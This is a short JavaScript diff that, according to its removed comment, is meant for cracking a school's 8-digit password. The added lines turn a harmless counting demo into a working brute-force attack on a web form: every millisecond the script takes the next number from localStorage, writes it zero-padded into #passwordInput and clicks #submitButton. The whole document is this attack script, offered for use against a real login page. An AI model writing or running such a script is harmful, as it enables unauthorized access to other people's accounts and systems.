@@ -1,22 +1,7 @@
-//mega tool used for cracking password for school because they are only 8 digets so is ezpz 
-
-let password = 612345
-let stock = 600000
-
-
-console.time("e")
 var solve = setInterval(function() {
+    let stock = parseInt(localStorage.getItem("password"))
     stock += 1
-
-    if (stock == password) {
-        console.log("Password found!")
-        console.log(stock, password)
-        clearInterval(solve)
-        console.timeEnd("e")
-    }
+    localStorage.setItem("password",stock)
+    document.querySelector("#passwordInput").value = `00${stock}`
+    document.querySelector("#submitButton").click()
 },1)
-
-
-
-
-
